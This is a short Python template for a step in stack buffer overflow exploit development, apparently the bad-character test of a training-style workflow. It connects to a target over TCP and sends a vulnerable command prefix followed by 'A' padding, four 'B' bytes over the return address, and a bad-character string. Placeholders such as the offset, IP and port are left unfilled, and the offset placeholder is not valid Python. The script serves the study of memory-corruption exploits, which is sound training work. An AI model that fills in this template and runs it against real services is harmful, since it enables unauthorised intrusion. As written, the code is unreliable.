#!/usr/bin/python3
#change exact_offset as your 
#change ipaddress and port as your
#change vulnerable_statement 
#change4.py's_output
 
import sys, socket 
from time import sleep

badchars = ("4.py's_output")

shellcode = "A" * //exact_offset// + "B" * 4 + badchars

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("//ipaddress//",port))
    
    payload = "vulnerable_statement /.:/" + shellcode
    
    s.send((payload.encode()))
    s.close()
    
except:
    print ("Erorr connecting to server")
    sys.exit()
    